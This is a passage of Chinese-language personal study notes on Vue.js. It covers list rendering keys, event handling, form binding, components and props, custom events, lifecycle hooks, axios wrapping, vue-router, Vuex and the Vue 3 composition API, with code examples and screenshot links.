                       {message:\"2\"},\n                                {message:\"3\"}\n                        ]\n                }\n        }\n}\n</script>\n```\n\n![image-20250301223635659](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301223635659.png)\n\n### 维护状态\n\n![image-20250301224216102](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301224216102.png)\n\n就地更新指的是\n\n```html\n<!--原来-->\n<script>\nexport default {\n        data(){\n                return{\n                        List:[\n                                {message:\"1\"},\n                                {message:\"2\"},\n                                {message:\"3\"}\n                        ]\n                }\n        }\n}\n</script>\n<!--发生更改-->\n<script>\nexport default {\n        data(){\n                return{\n                        List:[\n                                {message:\"1\"},\n                                {message:\"2\"},\n                                {message:\"3\"},\n                            \t{message:\"4\"}//只会重新渲染这一条新的\n                        ]\n                }\n        }\n}\n</script>\n```\n\n增加v-bind:key属性\n\n```html\n<template>\n        <li v-for=\"item in List\" :key=\"item.id\">\n                {{ item.message }}\n        </li>\n</template>\n\n<script>\nexport default {\n        data(){\n                return{\n                        List:[\n                                {id:1,message:\"1\"},\n                                {id:2,message:\"2\"},\n                                {id:3,message:\"33\"},\n                                {id:4,message:\"4\"}\n                        ]\n                }\n        }\n}\n</script>\n```\n\n如果数组中元素没有id怎么办，v-for遍历时其实有一个索引index，将index作为key\n\n```html\n<template>\n        <li v-for=\"(item,index) in List\" :key=\"index\">\n                {{ item.message }}\n        </li>\n</template>\n\n<script>\nexport default {\n        data(){\n                return{\n                        List:[\n                                {id:1,message:\"1\"},\n                                {id:2,message:\"2\"},\n                                {id:3,message:\"33\"},\n                                {id:4,message:\"4\"}\n                        ]\n                }\n        }\n}\n</script>\n```\n\n# 事件处理\n\n## 监听事件\n\n![image-20250301232347901](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301232347901.png)\n\nv-on缩写为@\n\n```html\n<template>\n        <button @click=\"count+=1\">{{ count }}</button>\n</template>\n\n<script>\nexport default {\n        data(){\n                return{\n                        count:0\n                }\n        }\n}\n</script>\n```\n\n## 事件处理方法\n\n![image-20250301232618798](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301232618798.png)\n\n```html\n<template>\n        <button @click=\"clickEvent\">{{ count }}</button>\n</template>\n\n<script>\nexport default {\n        data(){\n                return{\n                        count:0\n                }\n        },\n        methods:{\n                clickEvent(){\n                        this.count+=1;//在事件中读取data的属性需要用this.属性\n                }\n        }\n}\n</script>\n```\n\n```html\n<template>\n        <button @click=\"clickEvent\">{{ message }}</button>\n        <button @click=\"Increment\">count = {{ count }}</button>\n</template>\n\n<script>\nexport default {\n        data() {\n                return {\n                        count: 0,\n                        message: \"通知消息\"\n                }\n        },\n        methods: {\n                clickEvent(event) {\n                        event.target.innerHTML = \"点击了通知消息\";//对原生dom事件处理\n                },\n                Increment() {\n                        this.count += 1;\n                }\n        }\n}\n</script>\n```\n\n点击前：\n\n![image-20250301233631192](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301233631192.png)\n\n点击两个按钮后：\n\n![image-20250301233652783](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301233652783.png)\n\n## 内联处理器中的方法/事件传递参数\n\n![image-20250301234956862](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250301234956862.png)\n\n```html\n<!--实现效果：点击列表元素时弹窗内容是列表元素-->\n<template>\n        <li @click=\"ItemHandle(item)\" v-for=\"(item,index) in List\" :key=\"index\">\n                {{ item }}\n        </li>\n</template>\n\n<script>\nexport default {\n        data() {\n                return {\n                        count: 0,\n                        message: \"通知消息\",\n                        List:[\n                                '111','222','333'\n                        ]\n                }\n        },\n        methods: {\n                ItemHandle(item){\n                        alert(item);\n                }\n        }\n}\n</script>\n```\n\n# 表单输入绑定\n\n![image-20250302111039703](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250302111039703.png)\n\n```html\n<template>\n        <input v-model=\"username\">\n        <p>{{ username }}</p>\n</template>\n\n<script>\nexport default {\n        data(){\n                return{\n                        username:\"\"\n                }\n        }\n}\n</script>\n```\n\n实现效果，p标签中的值根据表单输入数据实时更新\n\n### 修饰符\n\n#### .lazy\n\n![image-20250302111847948](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250302111847948.png)\n\n```html\n<template>\n        <input v-model.lazy=\"username\">\n        <p>{{ username }}</p>\n</template>\n\n<script>\nexport default {\n        data(){\n                return{\n                        username:\"\"\n                }\n        }\n}\n</script>\n```\n\n回车之后才会同步更新，不会再一边输入一边同步\n\n#### .trim\n\n![image-20250302112125443](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250302112125443.png)\n\n# 组件基础\n\n## 单文件组件\n\n![image-20250302112313964](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250302112313964.png)\n\n模板：html（必须存在），逻辑：js（看需求存在），样式：css（看需求存在\n\n```html\n<template>\n\n</template>\n\n<script>\n\n</script>\n\n<style>\n\n</style>\n```\n\n## 加载组件\n\n![image-20250302120131965](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250302120131965.png)\n\n```html\n<!-- \n在根组件中App.vue中:\n    引入组件：import 组件名 from '组件文件的路径'\n    挂在组件:在export default{}块中加入components:{组件名}\n    显示组件:template块中加上标签<组件名/>\n-->\n\n<!--MyComponent.vue-->\n<template>\n        <h3>MyComponent</h3>\n</template>\n\n<script>\n        export default{//默认组件\n                name:'Mycomponent'//组件名\n        }\n</script>\n\n<!-- scoped:样式只在当前样式中生效 -->\n<style scoped>\n        h3{\n                color: crimson;\n        }\n</style>\n<!--App.vue-->\n<template>\n  <img alt=\"Vue logo\" src=\"./assets/logo.png\">\n  <MyComponent/>\n  <my-component/><!--也可以这样写，用-分开单词-->\n</template>\n\n<script>\n\nimport MyComponent from './components/MyComponent.vue';\nexport default {\n  name: 'App',\n  components: {\n    MyComponent\n  }\n}\n</script>\n\n<style>\n#app {\n  font-family: Avenir, Helvetica, Arial, sans-serif;\n  -webkit-font-smoothing: antialiased;\n  -moz-osx-font-smoothing: grayscale;\n  text-align: center;\n  color: #2c3e50;\n  margin-top: 60px;\n}\n</style>\n```\n\n效果:\n\n![image-20250302120856305](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250302120856305.png)\n\n## 组件的组织\n\n![image-20250302132914953](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250302132914953.png)\n\n# Props组件交互\n\n![image-20250302133211194](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250302133211194.png)\n\n父组件怎么向子组件中传参？\n\n```html\n<!--传参-->\n<template>\n        <img alt=\"Vue logo\" src=\"./assets/logo.png\">\n        <MyComponent :title=\"title\"/><!--:key=\"value\"的形式-->\n</template>\n\n<script>\nimport MyComponent from './components/MyComponent.vue';\n\nexport default {\n        name: 'App',\n        components: {\n                MyComponent\n        },\n        data(){\n                return {\n                        title:\"props组件交互\"\n                }\n        }\n}\n</script>\n\n<style>\n#app {\n        font-family: Avenir, Helvetica, Arial, sans-serif;\n        -webkit-font-smoothing: antialiased;\n        -moz-osx-font-smoothing: grayscale;\n        text-align: center;\n        color: #2c3e50;\n        margin-top: 60px;\n}\n</style>\n<!--接收参数-->\n<template>\n        <h3>props组件交互</h3>\n        <p>{{ title }}</p>\n</template>\n\n<script>\n        export default{\n                name:'MyComponent',\n                props:{//固定格式props:{参数名:{type:,default:}}\n                        title:{\n                                type:String,\n                                default:\"null\"//默认值\n                        }\n                }\n        }\n</script>\n\n<style scoped>\n        h3{\n                color: crimson;\n        }\n        p{\n                color:aquamarine;\n        }\n</style>\n```\n\n![image-20250302140230218](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250302140230218.png)\n\n```html\n<!-- 传递多个参数与数组 -->\n<template>\n        <img alt=\"Vue logo\" src=\"./assets/logo.png\">\n        <MyComponent :title=\"name\" :age=\"age\" :List=\"List\"/>\n</template>\n\n<script>\nimport MyComponent from './components/MyComponent.vue';\n\nexport default {\n        name: 'App',\n        components: {\n                MyComponent\n        },\n        data(){\n                return {\n                        name:\"props\",\n                        age:20,\n                        List:['amy','bob','cindy']\n                }\n        }\n}\n</script>\n\n<style>\n#app {\n        font-family: Avenir, Helvetica, Arial, sans-serif;\n        -webkit-font-smoothing: antialiased;\n        -moz-osx-font-smoothing: grayscale;\n        text-align: center;\n        color: #2c3e50;\n        margin-top: 60px;\n}\n</style>\n<!-- 接收多个参数与数组 -->\n<template>\n        <h3>props组件交互</h3>\n        <p>{{ title }}</p>\n        <p>age = {{ age }}</p>\n        <p v-for=\"(item,index) in List\" :key=\"index\"> {{ item }} </p>\n</template>\n\n<script>\n        export default{\n                name:'MyComponent',\n                props:{\n                        title:{\n                                type:String,\n                                default:\"null\"\n                        },\n                        age:{\n                                type:Number,\n                                default:0\n                        },\n                        List:{\n                                type:Array,\n                                //数组和对象必须以函数形式返回(工厂模式)\n                                default:function(){\n                                        return [];\n                                }\n                        }\n                }\n        }\n</script>\n\n<style scoped>\n        h3{\n                color: crimson;\n        }\n        p{\n                color:aquamarine;\n        }\n</style>\n```\n\n# 自定义事件组件交互\n\n用$emit()\n\n```html\n<!-- 发送 -->\n<template>\n        <h3>自定义事件组件交互</h3>\n        <button @click=\"SendMessage\">Click~</button>\n</template>\n\n<script>\n        export default{\n                name:'MyComponent',\n                data(){\n                        return{\n                                message:'这是一个信息'\n                        }\n                },\n                methods:{\n                        SendMessage(){\n                                /*\n                                参数一:字符串,是自定义的事件名\n                                参数二:要传递的内容\n                                */\n                                this.$emit('OnEvent',this.message);\n                        }\n                }\n        }\n</script>\n\n<style scoped>\n        h3{\n                color: crimson;\n        }\n        p{\n                color:aquamarine;\n        }\n</style>\n<!-- 接收 -->\n<template>\n        <img alt=\"Vue logo\" src=\"./assets/logo.png\">\n        <MyComponent @OnEvent=\"GetMessage\" /><!--@自定义事件=\"处理的函数\"-->\n        <p>{{ Message }}</p>\n</template>\n\n<script>\nimport MyComponent from './components/MyComponent.vue';\n\nexport default {\n        name: 'App',\n        components: {\n                MyComponent\n        },\n        data(){\n                return{\n                        Message:\"\"\n                }\n        },\n        methods: {\n                GetMessage(Message) {//Message就是自定义事件OnEvent传递过来的参数\n                        this.Message = Message\n                }\n        }\n}\n</script>\n\n<style>\n#app {\n        font-family: Avenir, Helvetica, Arial, sans-serif;\n        -webkit-font-smoothing: antialiased;\n        -moz-osx-font-smoothing: grayscale;\n        text-align: center;\n        color: #2c3e50;\n        margin-top: 60px;\n}\n</style>\n```\n\n# 组件生命周期\n\n![image-20250302183721270](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250302183721270.png)\n\n## 示意图\n\n![image-20250526162807435](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250526162807435.png)\n\n```bash\n#先执行以下命令\nnpm init vue@latest\n#一路选n\nnpm install / cnpm i\n\nnpm run dev\n```\n\n## 生命周期\n\n```c\n/*\n分为：\n创建期：beforeCreate created\n挂载期：beforeMount mounted\n更新期：beforeUpdate updated\n销毁期：beforeUnmount unmounted\n*/\n```\n\n**钩子函数不能写在methods块中**\n\n```html\n<template>\n        <h3>组件生命周期</h3>\n        <button @click=\"Increment\">count = {{ count }}</button>\n</template>\n\n<script>\nexport default {\n        data() {\n                return {\n                        count: 0\n                }\n        },\n        methods: {\n                Increment() {\n                        this.count += 1;\n                },\n        },\n        beforeCreate() {\n                console.log('创建前');\n        },\n        created() {\n                console.log('已创建');\n        },\n        beforeMount() {\n                console.log('挂载前');\n        },\n        mounted() {\n                console.log('已挂载');\n        },\n        beforeUpdate() {\n                console.log('更新前');\n        },\n        updated() {\n                console.log('更新后');\n        }\n}\n</script>\n\n<style>\nh3 {\n        color: crimson;\n}\n</style>\n```\n\n结果：\n\n![image-20250302191722582](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250302191722582.png)\n\n# Vue引入第三方\n\nhttps://github.com/vuejs/awesome-vue\n\n## Swiper\n\n官方文档:https://swiperjs.com/vue\n\n必须引入Swiper和SwiperSlide组件和swiper/css中的样式\n\n```bash\n#引入swiper,指定8.1.6版本\nnpm install --save swiper@8.1.6\n```\n\n```html\n<template>\n        <Swiper>\n                <SwiperSlide>\n                        <img src=\"../assets/logo.png\">\n                </SwiperSlide>\n                <SwiperSlide>\n                        <img src=\"../assets/logo.png\">\n                </SwiperSlide>\n                <SwiperSlide>\n                        <img src=\"../assets/logo.png\">\n                </SwiperSlide>\n        </Swiper>\n</template>\n\n<script>\nimport { Swiper, SwiperSlide } from 'swiper/vue';//引入组件\nimport 'swiper/css';//引入样式\n\n\nexport default {\n        name: 'HelloWorld',\n        components: {//注入组件\n                Swiper,\n                SwiperSlide\n        }\n}\n</script>\n\n<style scoped></style>\n```\n\n### 添加指示器\n\n```js\n//script标签中加上\nimport { Pagination } from 'swiper';\nimport 'swiper/css/pagination';\n//export default块中\ndata(){\n    return{\n        modules:[Pagination]\n    }\n}\n//Swiper标签中加上 :modules=\"modules\" :pagination=\"{clickable:true}\"\n```\n\n```html\n<template>\n        <Swiper :modules=\"modules\" :pagination=\"{clickable:true}\">\n                <SwiperSlide>\n                        <img src=\"../assets/logo.png\">\n                </SwiperSlide>\n                <SwiperSlide>\n                        <img src=\"../assets/logo.png\">\n                </SwiperSlide>\n                <SwiperSlide>\n                        <img src=\"../assets/logo.png\">\n                </SwiperSlide>\n        </Swiper>\n</template>\n\n<script>\nimport { Pagination } from 'swiper';\nimport { Swiper, SwiperSlide } from 'swiper/vue';\nimport 'swiper/css';\nimport 'swiper/css/pagination';\n\n\nexport default {\n        name: 'HelloWorld',\n        data(){\n                return{\n                        modules:[Pagination]\n                }\n        },\n        components: {\n                Swiper,\n                SwiperSlide\n        }\n}\n</script>\n\n<!-- Add \"scoped\" attribute to limit CSS to this component only -->\n<style scoped></style>\n```\n\n效果:\n\n![image-20250302195501331](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250302195501331.png)\n\n# 生命周期应用\n\n## 通过ref获取元素DOM结构\n\n获取DOM的时机：\n\n不能是创建期：UI还未渲染到页面上，无DOM结构\n\n挂载期：挂载前不行，理由同上；挂载后（mounted）可以\n\n更新期与销毁期也可以\n\n```html\n<template>\n        <!-- 要获取的DOM -->\n        <p ref=\"name\">ref~</p>\n</template>\n\n<script>\n        export default{\n                mounted(){\n                        console.log(this.$refs.name);//this.$refs.name获取\n                }\n        }\n</script>\n\n<!-- 根组件 -->\n<template>\n        <User />\n</template>\n\n<script>\nimport User from './components/User.vue'\nexport default{\n        components:{\n                User\n        }\n}\n</script>\n```\n\n\n\n## 模拟网络请求渲染数据\n\n时机：\n\ncreated:先获取到数据，但是还没渲染\n\nmounted：先渲染再获取数据\n\n我们选择后者的逻辑\n\n# AXios网络请求封装\n\n```bash\ncnpm install --save axios\ncnpm install --save querystring\nvue create demo\nnpm run serve\n```\n\n在src下新建一个目录utils，创建文件request.js来封装网络请求\n\n```js\nimport querystring from 'querystring'\nimport axios from 'axios'\nimport { config } from 'process';\nimport { log } from 'console';\n\nconst instance = axios.create({\n        //网络请求的公共属性\n        timeout: 10000 //ms\n})\n\n//处理错误\nconst errorHandle = (status,info) => {\n        switch(status){\n                default:\n                        console.log(info);\n        }\n}\n//常用于拦截器\n//发送数据前request\ninstance.interceptors.request.use(\n        //成功\n        config => {//config包含网络请求所有信息\n                if(config.method === 'post'){//对post请求特殊处理,axios中post返回json格式，querystring.stringify转换为url编码\n                        config.data = querystring.stringify(config.data);\n                }\n                return config;\n        },\n        //失败\n        error => {\n                //Promise.reject(error)会将错误抛出，从而可以在调用axios的地方通过 .catch()捕获错误\n                return Promise.reject(error);\n        }\n);\n//获取数据前response\ninstance.interceptors.response.use(\n        //成功\n        response => {\n                return response.status===200?Promise.resolve(response):Promise.reject(response)\n        },\n        //失败\n        error => {\n                //将error.response赋给response\n                const {response} = error;\n                errorHandle(response.status,response.info);\n        }\n);\n\nexport default instance;\n```\n\n将网络请求集中放在src/api中\n\n![image-20250302214622773](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250302214622773.png)\n\n```js\n//path.js\nconst Base = {\n        //公共路径\n        baseURL: \"\",\n        //拼在后面的\n        extra:\"\"\n}\n\nexport default Base;\n\n//index.js\nimport axios from \"../utils/request\";\nimport path from \"./path\";\n\nconst api = {\n        get(){\n                return axios.get(path.baseURL+path.extra);\n        }\n}\n\nexport default api;\n```\n\n# 动态组件\n\n```html\n<template>\n  <component :is=\"Component\"></component> <!-- :is来控制当前组件 -->\n  <button @click=\"changeComponent\">切换组件</button>\n</template>\n\n<script>\nimport A from './components/A.vue';\nimport B from './components/B.vue';\n\nexport default {\n  data() {\n    return {\n      Component: A, // 初始组件\n      componentsList: [A, B], // 组件列表\n      currentIndex: 0, // 当前组件索引\n    };\n  },\n  methods: {\n    changeComponent() {\n      // 切换组件\n      this.currentIndex = (this.currentIndex + 1) % this.componentsList.length;\n      this.Component = this.componentsList[this.currentIndex];\n    },\n  },\n};\n</script>\n```\n\n# 路由\n\n## 路由配置\n\n![image-20250303133659625](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250303133659625.png)\n\n1.安装路由\n\n```bash\nnpm install --save vue-router@4 #不使用@4的话,createWebHashHistory和createRouter不能同时使用\nvue create demo\ncd demo\nnpm run serve\n```\n\n2.配置独立的路由文件/src/route/index.js\n\n```js\n//index.js\nimport { createRouter,createWebHashHistory } from \"vue-router\";\nimport Home from '../view/Home.vue';\n\n/**\n\n * 页面的配置信息\n * path:路径\n * component:组件\n    */\n    const routes = [\n        {path:'/',component:Home},\n        //@通常指向src目录;()=>import()属于异步加载,指向这个路径时才会挂载\n        {path:'/about',component:() => import('@/view/About.vue')}\n    ];\n\nconst router = createRouter({\n        history:createWebHashHistory(),\n        routes,\n});\n\nexport default router;\n\n/**\n * createWebHashHistory()和createWebHistory()的区别\n * \n * createWebHashHistory():\n * 路径是这样的:/#/path...\n *      不需要后端配合重定向\n *      原理:<a>的锚点链接\n * createWebHistory():\n *      路径是这样的:/path...\n *      需要后端配合重定向,不然会404\n *      原理:H5 pushState()\n */\n```\n\n3.在main.js中注册组件\n\n```js\n//main.js\nimport { createApp } from 'vue'\nimport App from './App.vue'\nimport './registerServiceWorker'\nimport router from './route'\n\n//在mount前用use(router)注册组件\ncreateApp(App).use(router).mount('#app');\n```\n\n4.\n\n```html\n<!-- App.vue -->\n<template>\n        <img alt=\"Vue logo\" src=\"./assets/logo.png\">\n\t\t<!-- 路由跳转 -->\n        <RouterLink to=\"/\">首页 |</RouterLink>\n        <RouterLink to=\"/about\"> 关于</RouterLink>\n\t\t<!-- 路由的显示入口 -->\n        <router-view></router-view>\n</template>\n\n<script>\n\nexport default {\n        name: 'App',\n}\n</script>\n\n<style>\n#app {\n        font-family: Avenir, Helvetica, Arial, sans-serif;\n        -webkit-font-smoothing: antialiased;\n        -moz-osx-font-smoothing: grayscale;\n        text-align: center;\n        color: #2c3e50;\n        margin-top: 60px;\n}\n</style>\n\n```\n\n## 传递参数\n\n创建vue项目时把Router也勾选上\n\n![image-20250303150439342](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250303150439342.png)\n\n1.在routers数组中的path:'/path/:参数名'\n\n2.传递参数:router-link的to中'/path/参数值'\n\n3.读取参数 {{ $route.params.name }}\n\n```js\n//index.js\nimport { createRouter, createWebHashHistory } from 'vue-router'\nimport HomeView from '../views/HomeView.vue'\n\nconst routes = [\n  {\n    path: '/',\n    name: 'home',\n    component: HomeView\n  },\n  {\n    path: '/about',\n    name: 'about',\n    component: () => import('../views/AboutView.vue')\n  },\n  {\n    path:'/news',\n    //@通常指向src目录;()=>import()属于异步加载,指向这个路径时才会挂载\n    component: ()=>import('@/views/News.vue')\n  },\n  {\n    path:'/news/details/:name',\n    //@通常指向src目录;()=>import()属于异步加载,指向这个路径时才会挂载\n    component: ()=>import('@/views/NewsDetails.vue')\n  }\n]\n\nconst router = createRouter({\n  history: createWebHashHistory(),\n  routes\n})\n\nexport default router\n```\n\n```html\n<!-- 读取参数 -->\n<template>\n        <h3>平台:</h3>\n        <p>{{ $route.params.name }}</p>\n</template>\n```\n\n## 嵌套路由配置\n\n在页面配置信息的routes数组中的对象中加上children数组，填上子页面的信息(路径不能有/)\n\n如果希望默认打开某个子页面,用redirect重定向\n\n```js\n//index.js\nimport { createRouter, createWebHashHistory } from 'vue-router'\nimport HomeView from '../views/HomeView.vue'\n\nconst routes = [\n  {\n    path: '/',\n    name: 'home',\n    component: HomeView\n  },\n  {\n    path: '/about',\n    name: 'about',\n    component: () => import('../views/AboutView.vue'),\n    //默认的子导航\n    redirect:'/about/us',\n    //子导航\n    children:[\n      {\n        //子导航不加/\n        path:'us',\n        component: () => import('../views/AboutUs.vue')\n      },\n      {\n        path:'info',\n        component: () => import('../views/AboutInfo.vue')\n      }\n    ]\n  }\n]\n\nconst router = createRouter({\n  history: createWebHashHistory(),\n  routes\n})\n\nexport default router\n```\n\n# Vue状态管理(Vuex)\n\n![image-20250303160946625](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250303160946625.png)\n\n![image-20250303161129606](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250303161129606.png)\n\nstore就相当于集中式存储管理\n\n## 引入步骤\n\n1.安装Vuex\n\n```bash\ncnpm install --save vuex\n```\n\n2.配置文件/src/store/index.js\n\n```js\nimport { createStore } from 'vuex'\n\n//Vuex的作用就是管理组件间状态的\nexport default createStore({\n        //所有状态都放在这里(数据),可以被所有组件读取\n        state:{\n                count:0\n        }\n});\n```\n\n3.main.js中use()\n\n```js\nimport { createApp } from 'vue'\nimport App from './App.vue'\nimport './registerServiceWorker'\nimport store from '@/store'\n\ncreateApp(App).use(store).mount('#app')\n```\n\n3.访问数据\n\n```html\n<template>\n        <!-- 方法1 -->\n        <p>{{ $store.state.count }}</p>\n        <!-- 方法2 -->\n        <p>{{ count }}</p>\n</template>\n\n<script>\n        // <!-- 方法2 -->\n        import { mapState } from 'vuex';\n        export default{\n                computed:{\n                        ...mapState(['count'])\n                }\n        };\n</script>\n```\n\n\n\n# Vue状态管理核心(Vuex)\n\n![image-20250303164818191](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250303164818191.png)\n\n## Getter\n\n对Vuex中数据进行过滤\n\n```js\nimport { createStore } from 'vuex'\n\nexport default createStore({\n        state: {\n                count:0\n        },\n        getters: {\n            \t//要传入state\n                getCount(state){\n                        return state.count>0?state.count:'太小了!!!!!!';\n                }\n        },\n})\n```\n\n```html\n<template>\n  <img alt=\"Vue logo\" src=\"./assets/logo.png\">\n  <p>访问方法1=>{{ $store.getters.getCount }}</p>\n  <p>访问方法2=>{{ getCount }}</p>\n</template>\n\n<script>\nimport { mapGetters } from 'vuex'\nexport default {\n  computed:{\n    ...mapGetters(['getCount'])\n  }\n}\n</script>\n```\n\n## Mutation\n\n![image-20250303170427611](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250303170427611.png)\n\n```js\n//index.js\nimport { createStore } from 'vuex'\n\nexport default createStore({\n        state: {\n                count: 0\n        },\n        mutations: {\n                addCount(state) {\n                        state.count++;\n                }\n        }\n})\n```\n\n调用方法\n\n```html\n<template>\n        <img alt=\"Vue logo\" src=\"./assets/logo.png\">\n        <p>访问方法1=>{{ $store.getters.getCount }}</p>\n        <p>访问方法2=>{{ getCount }}</p>\n        <button @click=\"addCountHandle\">Click~</button>\n</template>\n\n<script>\nimport { mapGetters } from 'vuex'\nexport default {\n        computed: {\n                ...mapGetters(['getCount'])\n        },\n        methods: {\n                addCountHandle() {\n                        this.$store.commit('addCount');//this.$store.commit('mutations中的方法名')\n                }\n        }\n}\n</script>\n<!-- 或者可以这样写 -->\n<script>\nimport { mapGetters,mapMutations } from 'vuex'\nexport default {\n        computed: {\n                ...mapGetters(['getCount'])\n        },\n        methods: {\n                ...mapMutations(['addCount']),\n                addCountHandle() {\n                        this.addCount();\n                }\n        }\n}\n</script>\n```\n\n## Action\n\n![image-20250303171600399](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250303171600399.png)\n\n```JS\nimport { createStore } from 'vuex'\nimport axios from 'axios'\n\nexport default createStore({\n        state: {\n                count: 0\n        },\n        getters: {\n                getCount(state) {\n                        return state.count > 0 ? state.count : '太小了!!!!!!';\n                }\n        },\n        mutations: {\n                addCount(state) {\n                        state.count++;\n                }\n        },\n    \t//只能异步\n        actions: {\n                //{commit}:固定写法\n                asyncAddCount({ commit }) {\n                        axios.get('')//axios封装网络请求\n                        .then(\n                                res=>{\n                                        commit('addCount');\n                                }\n                        )\n                }\n        }\n})\n\n```\n\n```html\n<template>\n        <img alt=\"Vue logo\" src=\"./assets/logo.png\">\n        <p>访问方法1=>{{ $store.getters.getCount }}</p>\n        <p>访问方法2=>{{ getCount }}</p>\n        <button @click=\"addCountHandle\">Click~</button>\n        <button @click=\"AsyncAddCountHandle\">Click~</button>\n</template>\n\n<script>\nimport { mapGetters,mapMutations } from 'vuex'\nexport default {\n        computed: {\n                ...mapGetters(['getCount'])\n        },\n        methods: {\n                ...mapMutations(['addCount']),\n                addCountHandle() {\n                        this.addCount();\n                },\n                AsyncAddCountHandle(){\n                        this.$store.dispatch('asyncAddCount');\n                }\n        }\n}\n</script>\n```\n\n# Vue3新特性\n\n![image-20250304214035796](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250304214035796.png)\n\n## ref或reactive\n\n组合式API替换data(){},在setup()中声明变量（必须return）\n\n\n\nvue2.x中在data的return中声明\n\n```html\n<template>\n        <h3>vue3特性</h3>\n        <span>{{ message }}</span>\n</template>\n\n<script>\n        export default{\n                data(){\n                        return{\n                                message:\"message\"\n                        }\n                }\n        }\n</script>\n```\n\n用ref或reactive进行声明\n\n```html\n<template>\n        <h3>vue3特性</h3>\n        <span>{{ message }}</span>\n        <ul>\n                <li v-for=\"(item,index) in name.list\" :key=\"index\">{{ item }}</li>\n        </ul>\n</template>\n\n<script>\nimport {reactive, ref} from 'vue'\n        export default{\n                //组合式API必须要有setup\n                setup(){\n                        //ref\n                        const message = ref(\"ref\");\n                        //reactive:用于对象\n                        const name = reactive({\n                                list:['111','222','333']\n                        })\n                        //必须return\n                        return{\n                                message,\n                                name//name是一个对象，要访问的是name.list\n                        }\n                }\n        }\n</script>\n```\n\n## methods中定义的方法写在setup()\n\n```html\n<template>\n        <h3>vue3特性</h3>\n        <button @click=\"Increment\">count = {{ count }}</button>\n</template>\n\n<script>\nimport { reactive, ref } from 'vue'\nexport default {\n        //组合式API必须要有setup\n        setup() {\n                let count = ref(0);\n                const Increment = () => {\n                        //ref返回的是一个对象,要访问它的值需要.value\n                        count.value += 1;\n                };\n\n                return {\n                        count,\n                    //函数作为变量返回\n                        Increment\n                }\n        }\n}\n</script>\n```\n\n## setup()中使用props和content\n\n![image-20250305154230155](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250305154230155.png)\n\n```html\n<template>\n        <h3>vue3特性</h3>\n        <button @click=\"Increment\">count = {{ count }}</button>\n</template>\n\n<script>\nimport { reactive, ref } from 'vue'\nexport default {\n        //组合式API必须要有setup\n        setup(props) {\n                //props是一个Proxy代理对象\n        }\n}\n</script>\n```\n\n![image-20250305154707094](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250305154707094.png)\n\n```html\n<template>\n        <h3>vue3特性</h3>\n</template>\n\n<script>\n// import { reactive, ref } from 'vue'\nexport default {\n        //这步不能省略\n        props: {\n                message: String//只需要声明类型\n        },\n        setup(props) {\n                console.log(props.message)\n        }\n}\n</script>\n\n<template>\n        <HelloWorld message=\"msg\" />\n</template>\n\n<script>\nimport HelloWorld from './components/HelloWorld.vue';\n\nexport default {\n        components:{\n                HelloWorld\n        }\n}\n</script>\n```\n\n```html\n<template>\n        <h3>vue3特性</h3>\n        <h3>{{ msg }}</h3>\n</template>\n\n<script>\n// import { reactive, ref } from 'vue'\nexport default {\n        //这步不能省略\n        props: {\n                message: String//只需要声明类型\n        },\n        setup(props) {\n                //也通过这样声明，返回回去可以显示在页面上\n                const msg = props.message;\n                return {\n                        msg,\n                }\n        }\n}\n</script>\n```\n\nsetup中无法使用this获取实例对象，使用content可以获取实例对象\n\n## setup()中使用生命周期函数\n\n优势：setup中可以同时存在多个生命周期函数\n\n![image-20250305161228466](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250305161228466.png)\n\n```html\n<template>\n        <h3>vue3特性</h3>\n        <h3>{{ msg }}</h3>\n</template>\n\n<script>\nimport { onBeforeMount, onBeforeUnmount, onBeforeUpdate, onMounted, onUnmounted, onUpdated } from 'vue';\n\nexport default {\n        setup() {\n                //内部是箭头函数\n                onMounted(() => {\n                        console.log('onMounted1');\n                        \n                }),\n\n                onMounted(() => {\n                        console.log('onMounted2');\n                }),\n\n                onBeforeMount(() => {\n\n                }),\n                onUpdated(() => {\n\n                }),\n                onBeforeUpdate(() => {\n\n                }),\n                onUnmounted(() => {\n\n                }),\n                onBeforeUnmount(() => {\n\n                })\n        }\n}\n</script>\n```\n\n## Provide/Inject\n\n![image-20250305161838926](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250305161838926.png)\n\n可以跨层级传递，但是必须从上至下\n\n```html\n<!-- HelloWorld.vue -->\n<template>\n        <h3>{{ msg }}</h3>\n</template>\n\n<script>\nimport { inject } from 'vue';\n\n\n\n        export default{\n                setup(){\n                        const msg = inject(\"msg\");\n                        return{\n                                msg\n                        }\n                }\n        }\n</script>\n\n<!-- App.vue -->\n<template>\n        <img alt=\"Vue logo\" src=\"./assets/logo.png\">\n        